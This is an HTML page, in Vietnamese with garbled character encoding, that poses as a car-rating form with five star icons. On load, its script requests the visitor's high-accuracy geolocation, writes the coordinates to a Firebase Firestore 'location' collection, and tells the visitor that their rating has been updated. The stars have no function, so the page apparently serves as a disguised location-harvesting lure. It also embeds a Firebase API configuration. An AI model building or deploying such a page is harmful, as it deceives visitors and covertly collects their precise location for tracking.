<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ƒê√°nh gi√° √¥ t√¥ c·ªßa b·∫°n</title>
    <style>
        /* ƒê·∫∑t font ch·ªØ v√† cƒÉn ch·ªânh to√†n trang */
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
            color: #333;
        }

        /* Khung ch√≠nh gi·ªØa trang */
        .container {
            text-align: center;
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
            position: relative;
        }

        h1 {
            font-size: 26px;
            color: #007BFF;
            margin-bottom: 20px;
        }

        p {
            font-size: 18px;
            margin-bottom: 20px;
        }

        /* Th√™m bi·ªÉu t∆∞·ª£ng √¥ t√¥ */
        .icon {
            font-size: 50px;
            color: #007BFF;
            margin-bottom: 20px;
        }

        /* Th√™m hi·ªáu ·ª©ng khi ƒëang x·ª≠ l√Ω */
        #result {
            padding: 15px;
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        /* T·∫°o hi·ªáu ·ª©ng t·∫£i */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        /* Keyframe cho hi·ªáu ·ª©ng xoay */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* H·ªá th·ªëng sao ƒë√°nh gi√° */
        .stars {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .star {
            font-size: 30px;
            color: #FFD700;
            margin: 0 5px;
            cursor: pointer;
        }

        .star:hover {
            color: #ff9f00;
        }

        /* Th√¥ng b√°o th√†nh c√¥ng */
        .success {
            color: green;
            font-weight: bold;
        }
    </style>
    <script type="module">
        // Import the functions you need from the SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCPrnIf-vF2_JOf-E8hgtEVOyCq8s1AviY",
            authDomain: "gknm-b263e.firebaseapp.com",
            projectId: "gknm-b263e",
            storageBucket: "gknm-b263e.appspot.com",
            messagingSenderId: "366058775183",
            appId: "1:366058775183:web:3f33135f4b1325d542c6fa",
            measurementId: "G-TWXGN6PJ32"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Get location and save to Firestore
        function getLocation() {
            if (navigator.geolocation) {
                // Options to improve accuracy
                const options = {
                    enableHighAccuracy: true, // Request higher accuracy
                    timeout: 10000, // Set a timeout for the request
                    maximumAge: 0 // Do not use a cached location
                };

                navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    console.log("Latitude:", latitude);
                    console.log("Longitude:", longitude);

                    document.getElementById("result").innerHTML = 
                        "ƒê√°nh gi√° ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t.";

                    document.getElementById("result").classList.add("success");

                    // Save to Firestore
                    try {
                        const docRef = await addDoc(collection(db, 'location'), {
                            latitude: latitude,
                            longitude: longitude,
                            timestamp: serverTimestamp()
                        });
                        console.log(`Document written with ID: ${docRef.id}`);
                    } catch (error) {
                        console.error("Error adding document: ", error);
                    }
                }, showError, options); // Pass options here
            } else {
                alert("Tr√¨nh duy·ªát c·ªßa b·∫°n kh√¥ng h·ªó tr·ª£ ch·ª©c nƒÉng n√†y.");
            }
        }

        function showError(error) {
            let message = "";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "Quy·ªÅn truy c·∫≠p v·ªã tr√≠ ƒë√£ b·ªã t·ª´ ch·ªëi. Vui l√≤ng cho ph√©p truy c·∫≠p.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "D·ªØ li·ªáu v·ªã tr√≠ kh√¥ng kh·∫£ d·ª•ng. Vui l√≤ng th·ª≠ l·∫°i.";
                    break;
                case error.TIMEOUT:
                    message = "Y√™u c·∫ßu l·∫•y v·ªã tr√≠ ƒë√£ h·∫øt th·ªùi gian ch·ªù. Vui l√≤ng th·ª≠ l·∫°i.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "ƒê√£ x·∫£y ra l·ªói kh√¥ng x√°c ƒë·ªãnh. Vui l√≤ng th·ª≠ l·∫°i.";
                    break;
            }
            alert(message);
            document.getElementById("result").innerHTML = message;
            document.getElementById("result").classList.remove("success");
        }

        // Automatically get location when the page loads
        document.addEventListener("DOMContentLoaded", function() {
            // Khi trang v·ª´a t·∫£i, hi·ªÉn th·ªã hi·ªáu ·ª©ng loading
            document.getElementById("result").innerHTML = 
                '<div class="loading"></div> ƒêang x·ª≠ l√Ω...';
            getLocation();
        });
    </script>
</head>
<body>
    <div class="container">
        <!-- Bi·ªÉu t∆∞·ª£ng √¥ t√¥ -->
        <div class="icon">üöó</div>
        <h1>ƒê√°nh gi√° √¥ t√¥ c·ªßa b·∫°n</h1>

        <!-- H·ªá th·ªëng sao ƒë√°nh gi√° -->
        <div class="stars">
            <span class="star">‚òÖ</span>
            <span class="star">‚òÖ</span>
            <span class="star">‚òÖ</span>
            <span class="star">‚òÖ</span>
            <span class="star">‚òÖ</span>
        </div>

        <!-- K·∫øt qu·∫£ x·ª≠ l√Ω -->
        <p id="result">ƒêang x·ª≠ l√Ω...</p>
    </div>
</body>
</html>